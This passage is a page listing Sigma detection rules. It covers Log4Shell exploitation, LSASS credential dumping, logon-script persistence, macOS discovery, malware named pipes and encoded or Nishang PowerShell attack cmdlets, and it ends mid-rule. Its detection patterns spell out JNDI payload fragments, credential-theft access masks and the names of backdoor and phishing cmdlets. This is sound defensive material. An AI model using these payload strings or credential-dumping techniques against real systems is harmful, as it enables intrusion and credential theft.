<li><a href="#">title:Log4j RCE CVE-2021-44228 in Fields id: 9be472ed-893c-4ec0-94da-312d2765f654 status: experimental description: Detects exploitation attempt against log4j RCE vulnerability reported as CVE-2021-44228 in different header fields found in web server logs (Log4Shell) author: Florian Roth date: 2021/12/10 modified: 2022/02/06 references: - - - - - - tags: - attack.initial_access - attack.t1190 logsource: category: webserver detection: selection1: cs-User-Agent|contains: - '${jndi:ldap:/' - '${jndi:rmi:/' - '${jndi:ldaps:/' - '${jndi:dns:/' - '/$%7bjndi:' - '%24%7bjndi:' - '$%7Bjndi:' - '%2524%257Bjndi' - '%2F%252524%25257Bjndi%3A' - '${jndi:${lower:' - '${::-j}${' - '${jndi:nis' - '${jndi:nds' - '${jndi:corba' - '${jndi:iiop' - 'Reference Class Name: foo' - '${${env:BARFOO:-j}' - '${::-l}${::-d}${::-a}${::-p}' - '${base64:JHtqbmRp' - '${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$' - '${${lower:j}ndi:' - '${${upper:j}ndi:' - '${${::-j}${::-n}${::-d}${::-i}:' selection2: user-agent|contains: - '${jndi:ldap:/' - '${jndi:rmi:/' - '${jndi:ldaps:/' - '${jndi:dns:/' - '/$%7bjndi:' - '%24%7bjndi:' - '$%7Bjndi:' - '%2524%257Bjndi' - '%2F%252524%25257Bjndi%3A' - '${jndi:${lower:' - '${::-j}${' - '${jndi:nis' - '${jndi:nds' - '${jndi:corba' - '${jndi:iiop' - 'Reference Class Name: foo' - '${${env:BARFOO:-j}' - '${::-l}${::-d}${::-a}${::-p}' - '${base64:JHtqbmRp' - '${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$' - '${${lower:j}ndi:' - '${${upper:j}ndi:' - '${${::-j}${::-n}${::-d}${::-i}:' selection3: cs-uri|contains: - '${jndi:ldap:/' - '${jndi:rmi:/' - '${jndi:ldaps:/' - '${jndi:dns:/' - '/$%7bjndi:' - '%24%7bjndi:' - '$%7Bjndi:' - '%2524%257Bjndi' - '%2F%252524%25257Bjndi%3A' - '${jndi:${lower:' - '${::-j}${' - '${jndi:nis' - '${jndi:nds' - '${jndi:corba' - '${jndi:iiop' - 'Reference Class Name: foo' - '${${env:BARFOO:-j}' - '${::-l}${::-d}${::-a}${::-p}' - '${base64:JHtqbmRp' - '${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$' - '${${lower:j}ndi:' - '${${upper:j}ndi:' - '${${::-j}${::-n}${::-d}${::-i}:' selection4: cs-referer|contains: - '${jndi:ldap:/' - '${jndi:rmi:/' - '${jndi:ldaps:/' - '${jndi:dns:/' - '/$%7bjndi:' - '%24%7bjndi:' - '$%7Bjndi:' - '%2524%257Bjndi' - '%2F%252524%25257Bjndi%3A' - '${jndi:${lower:' - '${::-j}${' - '${jndi:nis' - '${jndi:nds' - '${jndi:corba' - '${jndi:iiop' - 'Reference Class Name: foo' - '${${env:BARFOO:-j}' - '${::-l}${::-d}${::-a}${::-p}' - '${base64:JHtqbmRp' - '${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$' - '${${lower:j}ndi:' - '${${upper:j}ndi:' - '${${::-j}${::-n}${::-d}${::-i}:' condition: 1 of selection* falsepositives: - Vulnerability scanning level: high 
<li><a href="#">title:Logging Configuration Changes on Linux Host id: c830f15d-6f6e-430f-8074-6f73d6807841 status: test description: Detect changes of syslog daemons configuration files author: Mikhail Larin, oscd.community references: - self experience date: 2019/10/25 modified: 2021/11/27 logsource: product: linux service: auditd detection: selection: type: 'PATH' name: - /etc/syslog.conf - /etc/rsyslog.conf - /etc/syslog-ng/syslog-ng.conf condition: selection fields: - exe - comm - key falsepositives: - Legitimate administrative activity level: high tags: - attack.defense_evasion - attack.t1562.006 
<li><a href="#">title:Login to Disabled Account id: 908655e0-25cf-4ae1-b775-1c8ce9cf43d8 status: experimental author: AlertIQ date: 2021/10/10 description: Detect failed attempts to sign in to disabled accounts. references: - logsource: product: azure service: signinlogs detection: selection: ResultType: 50057 ResultDescription: 'User account is disabled. The account has been disabled by an administrator.' condition: selection level: medium falsepositives: - Unknown tags: - attack.initial_access - attack.t1078 
<li><a href="#">title:Login with WMI id: 5af54681-df95-4c26-854f-2565e13cfab0 status: stable description: Detection of logins performed with WMI author: Thomas Patzke date: 2019/12/04 tags: - attack.execution - attack.t1047 logsource: product: windows service: security detection: selection: EventID: 4624 ProcessName|endswith: '\WmiPrvSE.exe' condition: selection falsepositives: - Monitoring tools - Legitimate system administration level: low 
<li><a href="#">title:Logon from a Risky IP Address id: c191e2fa-f9d6-4ccf-82af-4f2aba08359f status: experimental description: Detects when a Microsoft Cloud App Security reported when a user signs into your sanctioned apps from a risky IP address. author: Austin Songer @austinsonger date: 2021/08/23 references: - - logsource: service: threat_management product: m365 detection: selection: eventSource: SecurityComplianceCenter eventName: 'Log on from a risky IP address' status: success condition: selection falsepositives: - Unknown level: medium tags: - attack.initial_access - attack.t1078 
<li><a href="#">title:Logon Scripts (UserInitMprLogonScript) id: 0a98a10c-685d-4ab0-bddc-b6bdd1d48458 status: test description: Detects creation or execution of UserInitMprLogonScript persistence method author: Tom Ueltschi (@c_APT_ure), Tim Shelton references: - date: 2019/01/12 modified: 2022/05/31 logsource: category: process_creation product: windows detection: exec_selection: ParentImage|endswith: '\userinit.exe' exec_exclusion1: Image|endswith: - 'explorer.exe' - '\proquota.exe' exec_exclusion2: CommandLine|contains: - 'netlogon*.bat' - 'UsrLogon.cmd' - 'C:\WINDOWS\Explorer.EXE' exec_exclusion3: Image|endswith: '\Citrix\System32\icast.exe' create_keywords_cli: CommandLine|contains: 'UserInitMprLogonScript' condition: ( exec_selection and not 1 of exec_exclusion* ) or create_keywords_cli falsepositives: - Exclude legitimate logon scripts level: high tags: - attack.t1037.001 - attack.persistence 
<li><a href="#">title:Logon Scripts Creation in UserInitMprLogonScript Registry id: 9ace0707-b560-49b8-b6ca-5148b42f39fb status: test description: Detects creation of UserInitMprLogonScript persistence method author: Tom Ueltschi (@c_APT_ure) references: - - date: 2019/01/12 modified: 2022/06/26 logsource: category: registry_add product: windows detection: selection: EventType: CreateKey TargetObject|contains: 'UserInitMprLogonScript' condition: selection falsepositives: - Exclude legitimate logon scripts level: high tags: - attack.t1037.001 - attack.persistence - attack.lateral_movement 
<li><a href="#">title:LOLBAS Data Exfiltration by DataSvcUtil.exe id: e290b10b-1023-4452-a4a9-eb31a9013b3a status: experimental author: Ialle Teixeira @teixeira0xfffff, Austin Songer @austinsonger description: Detects when a user performs data exfiltration by using DataSvcUtil.exe date: 2021/09/30 modified: 2022/05/16 references: - - - - - tags: - attack.exfiltration - attack.t1567 logsource: category: process_creation product: windows detection: selection_cli: CommandLine|contains: - '/in:' - '/out:' - '/uri:' selection_img: - Image|endswith: '\DataSvcUtil.exe' - OriginalFileName: 'DataSvcUtil.exe' condition: all of selection* fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - DataSvcUtil.exe being used may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - DataSvcUtil.exe being executed from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. level: medium 
<li><a href="#">title:Lolbas OneDriveStandaloneUpdater.exe Proxy Download id: 3aff0be0-7802-4a7e-a4fa-c60c74bc5e1d description: | Detects setting a custom URL for OneDriveStandaloneUpdater.exe to download a file from the Internet without executing any anomalous executables with suspicious arguments. The downloaded file will be in C:\Users\redacted\AppData\Local\Microsoft\OneDrive\StandaloneUpdaterreSignInSettingsConfig.json status: experimental date: 2022/05/28 references: - author: frack113 logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject|contains: '\SOFTWARE\Microsoft\OneDrive\UpdateOfficeConfig\UpdateRingSettingURLFromOC' condition: selection falsepositives: - Unknown level: high tags: - attack.command_and_control - attack.t1105 
<li><a href="#">title:Lolbins Process Creation with WmiPrvse id: 8a582fe2-0882-4b89-a82a-da6b2dc32937 description: This rule will monitor LOLBin process creations by wmiprvse. Add more LOLBins to rule logic if needed. references: - - (aka_REvil)_Ransomware.yaml author: 'Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule)' tags: - attack.t1204.002 - attack.t1047 - attack.t1218.010 - attack.execution - attack.defense_evasion status: experimental date: 2021/08/23 modified: 2022/06/02 logsource: product: windows category: process_creation detection: #useful_information: add more LOLBins to the rules logic of your choice. selection1: Image|endswith: - '\regsvr32' - '\rundll32' - '\msiexec' - '\mshta' - '\verclsid' selection2: ParentImage|endswith: \wbem\WmiPrvSE.exe condition: selection1 and selection2 falsepositives: - Unknown level: high 
<li><a href="#">title:LPE InstallerFileTakeOver PoC CVE-2021-41379 id: 7dbb86de-a0cc-494c-8aa8-b2996c9ef3c8 status: experimental description: Detects PoC tool used to exploit LPE vulnerability CVE-2021-41379 references: - author: Florian Roth date: 2021/11/22 tags: - attack.initial_access - attack.t1190 logsource: product: windows service: application detection: selection: EventID: 1033 Provider_Name: 'MsiInstaller' keywords: - 'test pkg' condition: selection and keywords falsepositives: - Other MSI packages for which your admins have used that name level: high 
<li><a href="#">title:LSASS Access Detected via Attack Surface Reduction id: a0a278fe-2c0e-4de2-ac3c-c68b08a9ba98 description: Detects Access to LSASS Process status: experimental references: - author: Markus Neis date: 2018/08/26 modified: 2022/02/09 tags: - attack.credential_access # Defender Attack Surface Reduction - attack.t1003.001 logsource: product: windows service: windefend definition: 'Requirements:Enabled Block credential stealing from the Windows local security authority subsystem (lsass.exe) from Attack Surface Reduction (GUID: 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2)' detection: selection: EventID: 1121 Path|endswith: '\lsass.exe' filter_thor: ProcessName|startswith: 'C:\Windows\Temp\asgard2-agent\' ProcessName|endswith: - '\thor64.exe' - '\thor.exe' filter_exact: ProcessName: - 'C:\Windows\System32\atiesrxx.exe' - 'C:\Windows\System32\CompatTelRunner.exe' - 'C:\Windows\System32\msiexec.exe' - 'C:\Windows\System32\nvwmi64.exe' - 'C:\Windows\System32\svchost.exe' - 'C:\Windows\System32\Taskmgr.exe' - 'C:\Windows\System32\wbem\WmiPrvSE.exe' - 'C:\Windows\SysWOW64\msiexec.exe' filter_begins: ProcessName|startswith: - 'C:\Windows\System32\\DriverStore\' - 'C:\WINDOWS\Installer\' - 'C:\Program Files\' - 'C:\Program Files (x86)\' condition: selection and not 1 of filter_* falsepositives: - Google Chrome GoogleUpdate.exe - Some Taskmgr.exe related activity level: high 
<li><a href="#">title:LSASS Access from Non System Account id: 962fe167-e48d-4fd6-9974-11e5b9a5d6d1 description: Detects potential mimikatz-like tools accessing LSASS from non system account status: experimental date: 2019/06/20 modified: 2021/11/22 author: Roberto Rodriguez @Cyb3rWard0g references: - tags: - attack.credential_access - attack.t1003.001 logsource: product: windows service: security detection: selection: EventID: - 4663 - 4656 AccessMask: - '0x40' - '0x1400' # - '0x1000' # minimum access requirements to query basic info from service - '0x100000' - '0x1410' # car.2019-04-004 - '0x1010' # car.2019-04-004 - '0x1438' # car.2019-04-004 - '0x143a' # car.2019-04-004 - '0x1418' # car.2019-04-004 - '0x1f0fff' - '0x1f1fff' - '0x1f2fff' - '0x1f3fff' - '40' - '1400' - '1000' - '100000' - '1410' # car.2019-04-004 - '1010' # car.2019-04-004 - '1438' # car.2019-04-004 - '143a' # car.2019-04-004 - '1418' # car.2019-04-004 - '1f0fff' - '1f1fff' - '1f2fff' - '1f3fff' ObjectType: 'Process' ObjectName|endswith: '\lsass.exe' filter1: SubjectUserName|endswith: '$' filter2: ProcessName|startswith: 'C:\Program Files' # too many false positives with legitimate AV and EDR solutions condition: selection and not 1 of filter* fields: - ComputerName - ObjectName - SubjectUserName - ProcessName falsepositives: - Unknown level: high 
<li><a href="#">title:LSASS Access from Program in Suspicious Folder id: fa34b441-961a-42fa-a100-ecc28c886725 status: experimental description: Detects process access to LSASS memory with suspicious access flags and from a suspicious folder author: Florian Roth date: 2021/11/27 modified: 2022/07/01 references: - - - - - tags: - attack.credential_access - attack.t1003.001 - attack.s0002 logsource: category: process_access product: windows detection: selection: TargetImage|endswith: '\lsass.exe' GrantedAccess|endswith: - '10' - '30' - '50' - '70' - '90' - 'B0' - 'D0' - 'F0' - '18' - '38' - '58' - '78' - '98' - 'B8' - 'D8' - 'F8' - '1A' - '3A' - '5A' - '7A' - '9A' - 'BA' - 'DA' - 'FA' - '0x14C2' # - 'FF' SourceImage|contains: - '\Temp\' - '\Users\Public\' - '\PerfLogs\' - '\AppData\' - '\Temporary' filter1: SourceImage|contains|all: - 'C:\Users\' - '\AppData\Local\' SourceImage|endswith: - '\Microsoft VS Code\Code.exe' - '\software_reporter_tool.exe' - '\DropboxUpdate.exe' - '\MBAMInstallerService.exe' - '\WebexMTA.exe' GrantedAccess: '0x410' filter2: SourceImage|startswith: 'C:\Windows\Temp\' SourceImage|endswith: '.tmp\DropboxUpdate.exe' GrantedAccess: '0x410' filter_nextron: SourceImage|startswith: 'C:\Windows\Temp\asgard2-agent\' SourceImage|endswith: - '\thor64.exe' - '\thor.exe' GrantedAccess: - '0x1fffff' - '0x1010' condition: selection and not 1 of filter* fields: - User - SourceImage - GrantedAccess falsepositives: - Legitimate software accessing LSASS process for legitimate reason level: high 
<li><a href="#">title:LSASS Access from White-Listed Processes id: 4be8b654-0c01-4c9d-a10c-6b28467fc651 status: experimental description: Detects a possible process memory dump that uses the white-listed filename like TrolleyExpress.exe as a way to dump the lsass process memory without Microsoft Defender interference author: Florian Roth references: - - - date: 2022/02/10 tags: - attack.credential_access - attack.t1003.001 - attack.s0002 logsource: category: process_access product: windows detection: selection: TargetImage|endswith: '\lsass.exe' SourceImage|endswith: - '\TrolleyExpress.exe' # Citrix - '\ProcessDump.exe' # Cisco Jabber - '\dump64.exe' # Visual Studio GrantedAccess|endswith: - '10' - '30' - '50' - '70' - '90' - 'B0' - 'D0' - 'F0' - '18' - '38' - '58' - '78' - '98' - 'B8' - 'D8' - 'F8' - '1A' - '3A' - '5A' - '7A' - '9A' - 'BA' - 'DA' - 'FA' - '0x14C2' # - 'FF' condition: selection falsepositives: - Unlikely, since these tools shouldn't access lsass.exe at all level: high 
<li><a href="#">title:LSASS Memory Access by Tool Named Dump id: 9bd012ee-0dff-44d7-84a0-aa698cfd87a3 status: experimental description: Detects a possible process memory dump based on a keyword in the file name of the accessing process author: Florian Roth references: - - date: 2022/02/10 tags: - attack.credential_access - attack.t1003.001 - attack.s0002 logsource: category: process_access product: windows detection: selection: TargetImage|endswith: '\lsass.exe' SourceImage|contains: 'dump' GrantedAccess|endswith: - '10' - '30' - '50' - '70' - '90' - 'B0' - 'D0' - 'F0' - '18' - '38' - '58' - '78' - '98' - 'B8' - 'D8' - 'F8' - '1A' - '3A' - '5A' - '7A' - '9A' - 'BA' - 'DA' - 'FA' - '0x14C2' # - 'FF' condition: selection falsepositives: - Rare programs that contain the word dump in their name and access lsass level: high 
<li><a href="#">title:LSASS Memory Dump File Creation id: 5e3d3601-0662-4af0-b1d2-36a05e90c40a description: LSASS memory dump creation using operating systems utilities. Procdump will use process name in output file if no name is specified author: Teymur Kheirkhabarov, oscd.community references: - date: 2019/10/22 modified: 2021/08/16 tags: - attack.credential_access - attack.t1003.001 logsource: category: file_event product: windows detection: selection: TargetFilename|contains: 'lsass' TargetFilename|endswith: 'dmp' condition: selection fields: - ComputerName - TargetFilename falsepositives: - Dumping lsass memory for forensic investigation purposes by legitimate incident responder or forensic invetigator - Dumps of another process that contains lsass in its process name (substring) level: high status: experimental 
<li><a href="#">title:LSASS Memory Dump id: 5ef9853e-4d0e-4a70-846f-a9ca37d876da status: experimental description: Detects process LSASS memory dump using Mimikatz, NanoDump, Invoke-Mimikatz, Procdump or Taskmgr based on the CallTrace pointing to ntdll.dll, dbghelp.dll or dbgcore.dll for win10, server2016 and up. author: Samir Bousseaden, Michael Haag date: 2019/04/03 modified: 2022/03/20 references: - - - - tags: - attack.credential_access - attack.t1003.001 - attack.s0002 logsource: category: process_access product: windows detection: selection: TargetImage|endswith: '\lsass.exe' GrantedAccess|contains: #- '0x1fffff' # Too many false positives #- '0x01000' # Too many false positives #- '0x1010' # Too many false positives - '0x1038' # - '0x40' # Too many false positives #- '0x1400' # Too many false positives # - '0x1410' # Too many false positives - '0x1438' - '0x143a' CallTrace|contains: - 'dbghelp.dll' - 'dbgcore.dll' - 'ntdll.dll' filter_thor: CallTrace|contains|all: - '|C:\Windows\Temp\asgard2-agent\' - '\thor\thor64.exe+' - '|UNKNOWN(' GrantedAccess: '0x103800' condition: selection and not 1 of filter* falsepositives: - False positives are present when looking for 0x1410. Exclusions may be required. level: high 
<li><a href="#">title:Lsass Memory Dump via Comsvcs DLL id: a49fa4d5-11db-418c-8473-1e014a8dd462 description: Detects adversaries leveraging the MiniDump export function from comsvcs.dll via rundll32 to perform a memory dump from lsass. status: experimental date: 2020/10/20 modified: 2021/06/21 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.credential_access - attack.t1003.001 references: - - logsource: category: process_access product: windows detection: selection: TargetImage|endswith: '\lsass.exe' SourceImage: 'C:\Windows\System32\rundll32.exe' CallTrace|contains: 'comsvcs.dll' condition: selection falsepositives: - Unknown level: critical 
<li><a href="#">title:LSASS Memory Dumping id: ffa6861c-4461-4f59-8a41-578c39f3f23e status: test description: Detect creation of dump files containing the memory space of lsass.exe, which contains sensitive credentials. Identifies usage of Sysinternals procdump.exe to export the memory space of lsass.exe which contains sensitive credentials. author: E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community references: - - - date: 2019/10/24 modified: 2022/06/30 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains|all: - 'lsass' - '.dmp' selection2: Image|endswith: '\werfault.exe' selection3: Image|contains: '\procdump' Image|endswith: '.exe' CommandLine|contains: 'lsass' condition: (selection1 and not selection2) or selection3 fields: - ComputerName - User - CommandLine falsepositives: - Unlikely level: high tags: - attack.credential_access - attack.t1003.001 
<li><a href="#">title:LSASS Process Memory Dump Files id: a5a2d357-1ab8-4675-a967-ef9990a59391 related: - id: db2110f3-479d-42a6-94fb-d35bc1e46492 type: obsoletes description: Detects file names used by different memory dumping tools to create a memory dump of the LSASS process memory, which contains user credentials status: experimental author: Florian Roth references: - - - - - date: 2021/11/15 modified: 2022/06/27 tags: - attack.credential_access - attack.t1003.001 logsource: product: windows category: file_event detection: selection1: TargetFilename|endswith: - '\lsass.dmp' - '\lsass.zip' - '\lsass.rar' - '\Temp\dumpert.dmp' - '\Andrew.dmp' - '\Coredump.dmp' selection2: TargetFilename|contains: - '\lsass_2' # default format of procdump v9.0 is lsass_YYMMDD_HHmmss.dmp - '\lsassdump' - '\lsassdmp' selection3: TargetFilename|contains|all: - '\lsass' - '.dmp' selection4: TargetFilename|contains: 'SQLDmpr' TargetFilename|endswith: '.mdmp' selection5: TargetFilename|startswith: 'nanodump' TargetFilename|endswith: '.dmp' condition: 1 of selection* falsepositives: - Unknown level: high 
<li><a href="#">title:MacOS Emond Launch Daemon id: 23c43900-e732-45a4-8354-63e4a6c187ce status: test description: Detects additions to the Emond Launch Daemon that adversaries may use to gain persistence and elevate privileges. author: Alejandro Ortuno, oscd.community references: - - date: 2020/10/23 modified: 2021/11/27 logsource: category: file_event product: macos detection: selection_1: TargetFilename|contains: '/etc/emond.d/rules/' TargetFilename|endswith: '.plist' selection_2: TargetFilename|contains: '/private/var/db/emondClients/' condition: selection_1 or selection_2 falsepositives: - Legitimate administration activities level: medium tags: - attack.persistence - attack.privilege_escalation - attack.t1546.014 
<li><a href="#">title:MacOS Network Service Scanning id: 84bae5d4-b518-4ae0-b331-6d4afd34d00f status: test description: Detects enumeration of local or remote network services. author: Alejandro Ortuno, oscd.community references: - date: 2020/10/21 modified: 2021/11/27 logsource: category: process_creation product: macos detection: selection_1: Image|endswith: - '/nc' - '/netcat' selection_2: Image|endswith: - '/nmap' - '/telnet' filter: CommandLine|contains: 'l' condition: (selection_1 and not filter) or selection_2 falsepositives: - Legitimate administration activities level: low tags: - attack.discovery - attack.t1046 
<li><a href="#">title:Macos Remote System Discovery id: 10227522-8429-47e6-a301-f2b2d014e7ad status: test description: Detects the enumeration of other remote systems. author: Alejandro Ortuno, oscd.community references: - date: 2020/10/22 modified: 2021/11/27 logsource: category: process_creation product: macos detection: selection_1: Image|endswith: '/arp' CommandLine|contains: '-a' selection_2: Image|endswith: '/ping' CommandLine|contains: - ' 10.' #10.0.0.0/8 - ' 192.168.' #192.168.0.0/16 - ' 172.16.' #172.16.0.0/12 - ' 172.17.' - ' 172.18.' - ' 172.19.' - ' 172.20.' - ' 172.21.' - ' 172.22.' - ' 172.23.' - ' 172.24.' - ' 172.25.' - ' 172.26.' - ' 172.27.' - ' 172.28.' - ' 172.29.' - ' 172.30.' - ' 172.31.' - ' 127.' #127.0.0.0/8 - ' 169.254.' #169.254.0.0/16 condition: 1 of selection* falsepositives: - Legitimate administration activities level: informational tags: - attack.discovery - attack.t1018 
<li><a href="#">title:MacOS Scripting Interpreter AppleScript id: 1bc2e6c5-0885-472b-bed6-be5ea8eace55 status: test description: Detects execution of AppleScript of the macOS scripting language AppleScript. author: Alejandro Ortuno, oscd.community references: - date: 2020/10/21 modified: 2021/11/27 logsource: category: process_creation product: macos detection: selection: Image|endswith: '/osascript' CommandLine|contains: '-e' condition: selection falsepositives: - Application installers might contain scripts as part of the installation process. level: medium tags: - attack.execution - attack.t1059.002 
<li><a href="#">title:Mailbox Export to Exchange Webserver id: 516376b4-05cd-4122-bae0-ad7641c38d48 status: experimental description: Detects a successful export of an Exchange mailbox to untypical directory or with aspx name suffix which can be used to place a webshell or the needed role assignment for it references: - author: Florian Roth, Rich Warren, Christian Burkard date: 2021/08/09 modified: 2022/02/01 logsource: service: msexchange-management product: windows detection: export_command: - 'New-MailboxExportRequest' - ' -Mailbox ' export_params: - '-FilePath "\\\\localhost\\C$' - '-FilePath "\\\\127.0.0.1\\C$' - '.aspx' role_assignment: - 'New-ManagementRoleAssignment' - ' -Role "Mailbox Import Export"' - ' -User ' condition: (all of export_command and export_params) or all of role_assignment falsepositives: - Unlikely level: critical tags: - attack.persistence - attack.t1505.003 
<li><a href="#">title:Malicious Base64 Encoded Powershell Invoke Cmdlets id: fd6e2919-3936-40c9-99db-0aa922c356f7 status: test description: Detects base64 encoded powershell cmdlet invocation of known suspicious cmdlets author: pH-T related: - id: 6385697e-9f1b-40bd-8817-f4a91f40508e type: similar date: 2022/05/31 tags: - attack.execution - attack.t1059.001 - attack.defense_evasion - attack.t1027 references: - logsource: category: process_creation product: windows detection: selection: CommandLine|contains: # Invoke-BloodHound - 'SQBuAHYAbwBrAGUALQBCAGwAbwBvAGQASABvAHUAbgBkA' - 'kAbgB2AG8AawBlAC0AQgBsAG8AbwBkAEgAbwB1AG4AZA' - 'JAG4AdgBvAGsAZQAtAEIAbABvAG8AZABIAG8AdQBuAGQA' # Invoke-Mimikatz - 'SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA' - 'kAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6A' - 'JAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAeg' # Invoke-WMIExec - 'SQBuAHYAbwBrAGUALQBXAE0ASQBFAHgAZQBjA' - 'kAbgB2AG8AawBlAC0AVwBNAEkARQB4AGUAYw' - 'JAG4AdgBvAGsAZQAtAFcATQBJAEUAeABlAGMA' condition: selection fields: - CommandLine falsepositives: - Unlikely level: high 
<li><a href="#">title:Malicious Base64 Encoded PowerShell Keywords in Command Lines id: f26c6093-6f14-4b12-800f-0fcb46f5ffd0 status: test description: Detects base64 encoded strings used in hidden malicious PowerShell command lines author: John Lambert (rule) references: - date: 2019/01/16 modified: 2021/11/27 logsource: category: process_creation product: windows detection: encoded: Image|endswith: '\powershell.exe' CommandLine|contains: ' hidden ' selection: CommandLine|contains: - 'AGkAdABzAGEAZABtAGkAbgAgAC8AdAByAGEAbgBzAGYAZQByA' - 'aXRzYWRtaW4gL3RyYW5zZmVy' - 'IAaQB0AHMAYQBkAG0AaQBuACAALwB0AHIAYQBuAHMAZgBlAHIA' - 'JpdHNhZG1pbiAvdHJhbnNmZX' - 'YgBpAHQAcwBhAGQAbQBpAG4AIAAvAHQAcgBhAG4AcwBmAGUAcg' - 'Yml0c2FkbWluIC90cmFuc2Zlc' - 'AGMAaAB1AG4AawBfAHMAaQB6AGUA' - 'JABjAGgAdQBuAGsAXwBzAGkAegBlA' - 'JGNodW5rX3Npem' - 'QAYwBoAHUAbgBrAF8AcwBpAHoAZQ' - 'RjaHVua19zaXpl' - 'Y2h1bmtfc2l6Z' - 'AE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4A' - 'kATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8Abg' - 'lPLkNvbXByZXNzaW9u' - 'SQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuA' - 'SU8uQ29tcHJlc3Npb2' - 'Ty5Db21wcmVzc2lvb' - 'AE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQ' - 'kATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA' - 'lPLk1lbW9yeVN0cmVhb' - 'SQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0A' - 'SU8uTWVtb3J5U3RyZWFt' - 'Ty5NZW1vcnlTdHJlYW' - '4ARwBlAHQAQwBoAHUAbgBrA' - '5HZXRDaHVua' - 'AEcAZQB0AEMAaAB1AG4Aaw' - 'LgBHAGUAdABDAGgAdQBuAGsA' - 'LkdldENodW5r' - 'R2V0Q2h1bm' - 'AEgAUgBFAEEARABfAEkATgBGAE8ANgA0A' - 'QASABSAEUAQQBEAF8ASQBOAEYATwA2ADQA' - 'RIUkVBRF9JTkZPNj' - 'SFJFQURfSU5GTzY0' - 'VABIAFIARQBBAEQAXwBJAE4ARgBPADYANA' - 'VEhSRUFEX0lORk82N' - 'AHIAZQBhAHQAZQBSAGUAbQBvAHQAZQBUAGgAcgBlAGEAZA' - 'cmVhdGVSZW1vdGVUaHJlYW' - 'MAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkA' - 'NyZWF0ZVJlbW90ZVRocmVhZ' - 'Q3JlYXRlUmVtb3RlVGhyZWFk' - 'QwByAGUAYQB0AGUAUgBlAG0AbwB0AGUAVABoAHIAZQBhAGQA' - '0AZQBtAG0AbwB2AGUA' - '1lbW1vdm' - 'AGUAbQBtAG8AdgBlA' - 'bQBlAG0AbQBvAHYAZQ' - 'bWVtbW92Z' - 'ZW1tb3Zl' condition: encoded and selection falsepositives: - Unknown level: high tags: - attack.execution - attack.t1059.001 
<li><a href="#">title:Malicious Named Pipe id: fe3ac066-98bb-432a-b1e7-a5229cb39d4a status: experimental description: Detects the creation of a named pipe used by known APT malware references: - - - - - - - - - - - - date: 2017/11/06 modified: 2022/03/15 author: Florian Roth, blueteam0ps, elhoim logsource: product: windows category: pipe_created definition: 'Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (), but it is worth verifying. You can also use other repo, e.g. , . How to test detection? You can check powershell script from this site ' detection: selection: PipeName: - '\isapi_http' # Uroburos Malware - '\isapi_dg' # Uroburos Malware - '\isapi_dg2' # Uroburos Malware - '\sdlrpc' # Cobra Trojan - '\ahexec' # Sofacy group malware - '\winsession' # Wild Neutron APT malware - '\lsassw' # Wild Neutron APT malware - '\46a676ab7f179e511e30dd2dc41bd388' # Project Sauron - '\9f81f59bc58452127884ce513865ed20' # Project Sauron - '\e710f28d59aa529d6792ca6ff0ca1b34' # Project Sauron - '\rpchlp_3' # Project Sauron - '\NamePipe_MoreWindows' # Cloud Hopper - RedLeaves - '\pcheap_reuse' # Pipe used by Equation Group malware - '\gruntsvc' # Covenant default # - '\status_*' # CS default - '\583da945-62af-10e8-4902-a8f205c72b2e' # SolarWinds SUNBURST malware - '\bizkaz' # Snatch Ransomware - '\svcctl' #Crackmapexec smbexec default - '\Posh*' #PoshC2 default - '\jaccdpqnvbrrxlaf' #PoshC2 default - '\csexecsvc' #CSEXEC default - '\6e7645c4-32c5-4fe3-aabf-e94c2f4370e7' # LiquidSnake - '\adschemerpc' # Turla HyperStack - '\AnonymousPipe' # Hidden Cobra Hoplight - '\bc367' # Pacifier - '\bc31a7' # Pacifier - '\testPipe' # Emissary Panda Hyperbro - '\dce_3d' #Qbot condition: selection tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1055 falsepositives: - Unknown level: critical 
<li><a href="#">title:Malicious Nishang PowerShell Commandlets id: f772cee9-b7c2-4cb2-8f07-49870adc02e0 status: experimental description: Detects Commandlet names and arguments from the Nishang exploitation framework date: 2019/05/16 modified: 2021/10/16 references: - tags: - attack.execution - attack.t1059.001 author: Alec Costello logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: - Add-ConstrainedDelegationBackdoor - Set-DCShadowPermissions - DNS_TXT_Pwnage - Execute-OnTime - HTTP-Backdoor - Set-RemotePSRemoting - Set-RemoteWMI - Invoke-AmsiBypass - Out-CHM - Out-HTA - Out-SCF - Out-SCT - Out-Shortcut - Out-WebQuery - Out-Word - Enable-Duplication - Remove-Update - Download-Execute-PS - Download_Execute - Execute-Command-MSSQL - Execute-DNSTXT-Code - Out-RundllCommand - Copy-VSS - FireBuster - FireListener - Get-Information - Get-PassHints - Get-WLAN-Keys - Get-Web-Credentials - Invoke-CredentialsPhish - Invoke-MimikatzWDigestDowngrade - Invoke-SSIDExfil - Invoke-SessionGopher - Keylogger - Invoke-Interceptor - Create-MultipleSessions - Invoke-NetworkRelay - Run-EXEonRemote - Invoke-Prasadhak - 